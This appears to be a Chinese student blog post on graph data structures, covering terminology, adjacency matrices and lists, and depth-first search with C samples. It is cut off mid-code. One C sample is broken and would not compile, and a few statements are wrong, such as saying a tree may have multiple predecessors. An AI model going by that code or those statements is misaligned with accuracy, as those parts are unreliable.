    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="图的定义和基本术语"><a href="#图的定义和基本术语" class="headerlink" title="图的定义和基本术语"></a>图的定义和基本术语</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%9B%BE%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD.png"></p><ol><li><p>完全图</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%AE%8C%E5%85%A8%E5%9B%BE.png"></p><p>有<code>n</code>个点每个点都与<code>n-1</code>个点有边，但是注意如果是无向的边则应该是<code>n*(n-1)/2</code>。如果是有向的边，则应该是<code>n*(n-1)</code></p></li><li><p>稀疏图(e&lt;nlogn)</p><p><strong>带箭头的边称为狐</strong></p><p>有很少的边或狐的图</p></li><li><p>稠密图</p><p>有较多的边或狐的图</p></li><li><p>网</p><p>边&#x2F;狐带权（有意义，如：<code>20km</code>等）的图</p></li><li><p>邻接</p><p>有边&#x2F;狐相连的两个顶点之间的关系</p><p>根据离散的知识(V<del>i</del>,V<del>j</del>)这是不分先后的（小括号括起来），则说V<del>i</del>,V<del>j</del>互称为邻接点</p><p>&lt;V<del>i</del>,V<del>j</del>&gt;则则是有序的，对应有向的图V<del>i</del>邻接到V<del>j</del>，V<del>j</del>邻接于V<del>i</del></p></li><li><p>关联（依附）</p><p>边或者狐与顶点的关系</p></li><li><p>顶点的度</p><p>该顶点相关联的边的条数</p><p>在有向图当中，顶点的度等于该顶点的出度和入度之和</p><ul><li>入度：是以该顶点为终点的有向边</li><li>出度：是以该顶点为起点的有向边</li></ul><p>有向树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%89%E5%90%91%E6%A0%91.png"></p></li><li><p>路径</p><p>按续的边构成的点的顶点序列</p></li><li><p>路径长度</p><p>路径上边或者狐的数目（权值）之和</p></li><li><p>环（回路）</p><p>第一个顶点和最后一个顶点相同的路径</p></li><li><p>简单的路径</p><p>除了路径的起点和终点可以相同，其他的都不同</p></li><li><p>简单的回路（简单的环）：除路径和终点相同，其他的顶点都不相同（注意区别简单路径和简单的回路）</p></li><li><p>连通图</p><p>就是图中任意的两个点都能够连接起来</p></li><li><p>权</p><p>图中的边或则弧线具有的相关的数被称为权。表明从一个顶点到另一个顶点的距离和消耗</p></li><li><p>网</p><p>带权的图</p></li><li><p>子图</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%AD%90%E5%9B%BE.png"></p><p>如果一个图是；另一个图的一部分就说明是子图</p></li><li><p>连通分量</p><p>无向图的最大联通的子图就称为G 的连通分量</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F.png"></p></li><li><p>强连通分量</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F.png"></p></li><li><p>极小连通子图</p><p>就是连通子图，如果再删除一条边，就不连通则说明是极小的连同子图</p></li><li><p>生成树</p><p>包含无向图的的所有的顶点的绩极小的联通子图</p></li><li><p>图和树的不同</p><ul><li>树是一种特殊的图，但是没有环，也就是说树的两个结点只有唯一路径</li><li>树的每一个节点有且仅有<code>1</code>或者<code>0</code>个前驱。但是树可以有多个前驱</li><li>树的每一个结点只会存在一种关系，即父子关系。但是图可以有多种关系。比如：有向边和无向边</li><li>树一般用于分层存储和处理数据，如文件系统等；而图则更加灵活，可以用于表示各种复杂关系和网络结构，如社交网络、电脑网络、交通网络等等。</li></ul></li><li><p>相同点</p><p>树和图是两种基本的非线性数据结构</p></li></ol><h2 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h2><h3 id="数组表示法（邻接矩阵）"><a href="#数组表示法（邻接矩阵）" class="headerlink" title="数组表示法（邻接矩阵）"></a>数组表示法（邻接矩阵）</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p><p>使用矩阵的方式，如果两个点存在一个则对应的数组的值为<code>1</code>，反之为<code>0</code></p><p>无向图的邻接矩阵表示法</p><ol><li><p>临界矩阵的特点</p><ul><li>对角线值为0</li><li>矩阵是对称的</li></ul></li><li><p>矩阵度的计算</p><p>定点<code>i</code>的度，就是第<code>i</code>行<code>1</code>的个数</p><p>特别的完全图的邻接矩阵中，对角线元素为0，其余为1</p></li></ol><p><strong>有向图的邻接矩阵表示法</strong></p><ol><li><p>同理，有箭头的则是<code>1</code>，也就是从该点指出去</p></li><li><p>第<code>i</code>行的含义</p><p>以节点v<del>i</del>为结尾的弧（出度）</p></li><li><p>第<code>i</code>列的含义</p><p>以节点v<del>i</del>为头的弧（入度）</p></li><li><p>有向图的度</p><p>是出度和入度的和</p></li></ol><p><strong>邻接矩阵的实现</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AE%9E%E7%8E%B0.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100   <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//定点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125;AMGraph;<br><br></code></pre></td></tr></table></figure><p><strong>网的表示法</strong></p><ol><li>将有连接的转变成权值而不是<code>1</code></li><li>没有连接的为<code>0</code></li></ol><p><strong>无向图的创建</strong></p><ol><li><p>算法思想</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%97%A0%E5%90%91%E7%BD%91%E7%9A%84%E5%88%9B%E5%BB%BA.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100   <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> statue;<br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//定点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125;AMGraph,*pAMGraph;<br>   <br>   <br><span class="hljs-comment">//查找对应的下标</span><br><span class="hljs-comment">//int LocateVex(pAMGraph G,char ch) &#123;</span><br><span class="hljs-comment">//for (int i = 0; i &lt; G-&gt;vexnum; i++)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//if (ch == G-&gt;vexs[i]) &#123;</span><br><span class="hljs-comment">//return i;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//return -1;</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//&#125;</span><br>   <br>statu ue <span class="hljs-title function_">CreatUDN</span><span class="hljs-params">(pAMGraph *G)</span> &#123;<br>    <span class="hljs-type">int</span> x, y;<span class="hljs-comment">//模拟二维数组的x,y;</span><br>    <span class="hljs-type">char</span> aPoint,bPoint;<span class="hljs-comment">//</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;(*G)-&gt;vexnum, &amp;(*G)-&gt;arcnum);<br>    <span class="hljs-comment">//创建节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;vexnum; i++)<br>    &#123;<br>        (*G)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>    &#125;<br>   <br>    <span class="hljs-comment">//初始化表</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;arcnum; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (*G)-&gt;arcnum; j++)<br>        &#123;<br>            (*G)-&gt;arcs[i][j] = MaxInt;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//赋予权值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;arcnum; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (*G)-&gt;arcnum; j++)<br>        &#123;<br>            (*G)-&gt;arcs[i][j] = MaxInt;<br>        &#125;<br>    &#125; <br>   <br>    <span class="hljs-comment">////对每一条边进行赋值</span><br>    <span class="hljs-comment">//scanf(&quot;%c%c&quot;, &amp;aPoint,&amp;bPoint);//对a-&gt;b的边进行赋权</span><br>    <span class="hljs-comment">//x = LocateVex(G, aPoint);</span><br>    <span class="hljs-comment">//y = LocateVex(G, bPoint);</span><br>    <span class="hljs-comment">//for (int i = 0; i &lt; (*G)-&gt;vexnum; ++i) &#123;</span><br>    <span class="hljs-comment">//scanf(&quot;%d&quot;, &amp;(*G)-&gt;arcs[x][y]);</span><br>    <span class="hljs-comment">//(*G)-&gt;arcs[x][y] = (*G)-&gt;arcs[y][x];//无向网，所以邻接矩阵是对称的</span><br>   <br>    <span class="hljs-comment">//&#125;</span><br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    pAMGraph G = (pAMGraph)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    CreatUDN(&amp;G);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p><strong>邻接矩阵构建有向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E6%9C%89%E5%90%91%E5%9B%BE.png"></p><p><strong>使用邻接矩阵的优点</strong></p><blockquote><ol><li><p>直观简单</p></li><li><p>方便查看某个图的节点</p></li><li><p>方便查找任意节点的邻接点</p></li><li><p>方便计算出某个节点的度</p></li></ol></blockquote><p><strong>使用邻接矩阵的缺点</strong></p><blockquote><p>空间复杂度是O(n^2^)</p></blockquote><h3 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h3><ol><li><p>邻接表 </p><p><strong>无向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><ul><li><p>头结点</p><ul><li><p>第一个元素</p><p>存放定点的数据</p></li><li><p>第二个元素</p><p>存放边节点</p></li></ul></li><li><p>表结点（边节点）</p><ul><li><p>第一个元素</p><p>存放弧终点的节点</p></li><li><p>第二个元素</p><p>存放另一个弧终点的地址</p></li><li><p>第三个元素（图片无）</p><p>存放权值</p></li></ul></li><li><p>不唯一性</p><p>因为每一个边的链表顺序可以变</p><p>按道理来说，应该会有很多种</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E8%A1%A8%E7%9A%84%E7%89%B9%E7%82%B9.png"></p></li><li><p>使用邻接矩阵创建邻接表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>     <br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    VerTexType adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br>     <br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br>     <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>     <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br>     <br>&#125;<br>     <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = amGraph-&gt;vexs[j];<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=amGraph-&gt;vexs[j];<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>     <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>有向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%80%86%E9%82%BB%E6%8E%A5%E8%A1%A8%E5%92%8C%E9%82%BB%E6%8E%A5%E8%A1%A8%E7%9A%84%E5%AF%B9%E6%AF%94.png"></p></li><li><p>邻接多重表</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E5%A4%9A%E9%87%8D%E8%A1%A8.png"></p><p>每个数字后面的空格都是，存放指针，用于连接</p><ul><li>连接顺序不唯一</li></ul></li><li><p>十字链表</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%8D%81%E5%AD%97%E9%93%BE%E8%A1%A8.png"></p><p>给顶点结点加一个指向出度边的指针</p><p>给狐结点添一个把该节点当成头节点的狐的数据域和指针域</p><p>优点：有利于找到出度和入度，通过<code>head</code>可以找到整个入度的边</p></li></ol><h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><ul><li><p>遍历的实质</p></li><li><p>怎么防止重复访问？</p><p>图中含有回路，而且每一个顶点都与其他顶点相通，所以可能通过某一个过程又回到了原来的点</p><blockquote><p>设置一个辅助的数组，用来标记每一个被访问的顶点，初始状态为<code>0</code></p><p>被访问了，就应该改变状态</p></blockquote><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86.png"></p></li></ul><h3 id="深度优先搜索（DFS）"><a href="#深度优先搜索（DFS）" class="headerlink" title="深度优先搜索（DFS）"></a>深度优先搜索（<code>DFS</code>）</h3><h4 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a><strong>邻接矩阵</strong></h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2.png"></p><ul><li><p>采取递归的方法</p></li><li><p>防止循环遍历，我们应该建立一个<code>visit</code>存放所有的结点，然后我们把遍历过的结点标识为<code>1</code></p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>  <br>  <br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>  <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<span class="hljs-comment">//无向边</span><br>  <br>&#125;<br>  <br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AMGraph *amGraph, <span class="hljs-type">int</span> visited[],<span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,amGraph-&gt;vexs[sub]);<br>    visited[sub]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        <span class="hljs-keyword">if</span> 